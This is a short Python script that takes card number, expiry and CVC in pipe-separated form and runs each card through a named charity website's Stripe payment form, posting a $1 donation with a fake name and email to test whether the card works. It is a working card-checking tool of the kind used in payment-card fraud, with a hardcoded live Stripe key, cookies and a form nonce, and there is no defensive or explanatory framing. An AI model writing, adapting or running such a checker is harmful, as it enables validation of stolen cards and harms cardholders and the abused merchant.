import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fa0db62dbc6%3B+stripe-js-v3%2Fa0db62dbc6%3B+card-element&referrer=https%3A%2F%2Fwww.thefmlproject.com&time_on_page=48243&key=pk_live_7y6vjcB52b43MWJ6tkYp3TTo00sWjzS7yD'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '_ga_XWLNRLSHJR': 'GS1.1.1736913075.1.0.1736913075.0.0.0',
	    '_ga': 'GA1.1.285425559.1736913075',
	    'tk_or': '%22https%3A%2F%2Fwww.google.com%2F%22',
	    'tk_r3d': '%22https%3A%2F%2Fwww.google.com%2F%22',
	    'tk_lr': '%22https%3A%2F%2Fwww.google.com%2F%22',
	    '_ga_1NGFDZQ63D': 'GS1.1.1736913076.1.0.1736913076.0.0.0',
	    '__stripe_mid': '88959a63-4ca5-41e6-bde0-67f3f697326ed9ed5b',
	    '__stripe_sid': 'be5ff5c4-2963-4274-9925-afc98eacd64ff969dd',
	}
	
	headers = {
	    'authority': 'www.thefmlproject.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_ga_XWLNRLSHJR=GS1.1.1736913075.1.0.1736913075.0.0.0; _ga=GA1.1.285425559.1736913075; tk_or=%22https%3A%2F%2Fwww.google.com%2F%22; tk_r3d=%22https%3A%2F%2Fwww.google.com%2F%22; tk_lr=%22https%3A%2F%2Fwww.google.com%2F%22; _ga_1NGFDZQ63D=GS1.1.1736913076.1.0.1736913076.0.0.0; __stripe_mid=88959a63-4ca5-41e6-bde0-67f3f697326ed9ed5b; __stripe_sid=be5ff5c4-2963-4274-9925-afc98eacd64ff969dd',
	    'origin': 'https://www.thefmlproject.com',
	    'referer': 'https://www.thefmlproject.com/pay/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1736913125692',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=2655&_fluentform_10_fluentformnonce=e74b8348a0&_wp_http_referer=%2Fpay%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser04%40gmail.com&description=Creation&custom-payment-amount=1&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '10',
	}
	
	r2 = requests.post(
	    'https://www.thefmlproject.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
